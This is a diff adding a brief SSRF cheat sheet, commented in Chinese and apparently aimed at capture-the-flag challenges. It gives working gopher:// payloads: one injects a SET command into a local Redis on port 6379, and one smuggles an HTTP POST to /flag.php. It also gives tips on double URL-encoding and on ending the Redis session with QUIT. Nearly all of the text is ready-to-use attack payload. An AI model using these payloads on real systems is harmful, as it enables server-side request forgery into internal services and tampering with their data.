@@ -1,0 +1,13 @@
+# 以下假設使用 curl, 如果是搭配 ssrf, 記得 double encode => %20 -> %2520
+
+############################# redis ################################ 
+NOTE: 
+1. 沒有 QUIT 會卡住
+2. " -> %22
+
+gopher://127.0.0.1:6379/_SET%20key%20%22value%22%0D%0AQUIT
+
+
+############################# http #################################
+gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0D%0AHOST:127.0.0.1%0D%0AContent-Length:%2014%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Agivemeflag=yes
+
